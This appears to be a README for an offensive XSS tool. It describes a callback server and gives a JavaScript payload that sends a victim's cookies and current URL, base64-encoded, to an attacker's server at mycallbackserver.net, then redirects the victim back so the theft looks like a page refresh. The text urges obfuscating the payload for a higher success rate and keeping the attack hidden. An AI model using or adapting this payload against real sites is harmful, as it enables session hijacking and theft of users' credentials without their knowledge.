## Description

This repo contains an example of a CORS callback server and an XSS payload that, once executed, will change the current window location of the victim to your callback address, which returns a **301 Moved Permanently** response sending the victim back to its referer, although this time with a token in the URL anchor, preventing the XSS payload from reactivating.

This enables you to sniff sensitive data via URL parameters when the victim is sent to your callback address.

If the victim did not send a Referer header, you can include the referer address in a URL parameter. If no referer is provided, the victim will be redirected to a panic address of your choice, in an attempt to keep the attack hidden.

When the attack is successful, the victim experienced what seemed like a page refresh at most.

## Usage

First of all make sure that your callback server is listening.

Use the following code in your XSS payload. Be sure to change the address to that of your callback server, and change the token at the very least. The more you obfuscate this code, the higher your success rate will be. 

Refine your payload as required, or it may get triggered unexpectedly.

```javascript
const token = "w3lRZ87e";
if (location.hash != token) self.location = "https://mycallbackserver.net/callback.php" + 
  "?referer=" + encodeURIComponent( btoa(self.location.href) ) + 
  "&data=" + encodeURIComponent( btoa(document.cookie) ) + 
  "&token=" + encodeURIComponent( btoa(token) );
```

<sup>If you choose not to include a referer in the URL parameters, the callback server defaults to the **`Referer`** header of the request.<br>If neither a referer parameter or Referer header is present, the panic address is used.</sup>
